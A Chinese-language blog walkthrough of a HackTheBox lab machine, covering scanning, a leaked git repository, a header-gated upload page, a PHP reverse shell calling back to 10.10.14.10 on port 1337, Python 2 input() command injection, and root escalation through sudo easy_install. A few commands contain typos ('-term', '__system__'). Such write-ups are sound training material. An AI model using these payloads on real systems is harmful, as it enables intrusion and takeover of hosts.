---
title: HackTheBox-Upload
date: 2025-3-19 20:00:00
tags: 红队
categories: 红队打靶-Linux
---



# nmap 

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

# 80端口

## **vhost扫描**

```
gobuster vhost -u http://10.10.11.177 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -u "http://FUZZ.siteisup.htb" -w /usr/share/wordlists/amass/subdomains.lst -ms 200,301 -t 100
```

发现子域名dev.siteisup.htb

现将siteisup.htb加入DNS记录

## **目录扫描**

```
dirsearch -u http://10.10.11.117
dirsearch -u http://10.10.11.117/dev
gobuster dir -u http://10.10.11.177 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

扫目录发现/dev

访问/dev目录为空

继续扫/dev目录发现git文件泄露

使用git-dumper将git下载到本地进行分析，发现

.htaccess

```
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

dev.siteisup.htb需要添加一个特殊的**请求头**

```
Special-Dev:only4dev
```

还得到相关源码，index.php中有page参数，有文件包含漏洞，正好dev.siteisup.htb是文件上传，文件上传之后利用文件包含来执行，但是check.php对文件进行了限制，先上传phpinfo检查disable_function

proc_open没被禁用

```
反弹shell
<?php
$descriptorspec = array(
0 => array('pipe', 'r'), // stdin
1 => array('pipe', 'w'), // stdout
2 => array('pipe', 'a') // stderr
);
$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.10/1337 0>&1'";
$process = proc_open($cmd, $descriptorspec, $pipes, null, null);
?>
```

# 提权

```
查找有suid权限的文件
find / -type f -term -u=s 2>/dev/null
```

找到siteisup，同目录下还有siteisup.py

```python
***siteisup.py***

import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```

执行siteisup时是以developer的权限执行的

input在Python2中是不安全的可以进行命令执行，行为类似于eval

```
执行__system__('os').system('/bin/bash')
```

得到developer权限，但是用户组还是www-data,无法访问user.txt但是可以访问.ssh，可以查看自己的公私钥，将私钥保存在本地，ssh连接develop，即可查看user.txt

sudo -l发现有/usr/local/bin/easy_install权限

easy_install可以进行sudo提权

```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```

即可成功得到root权限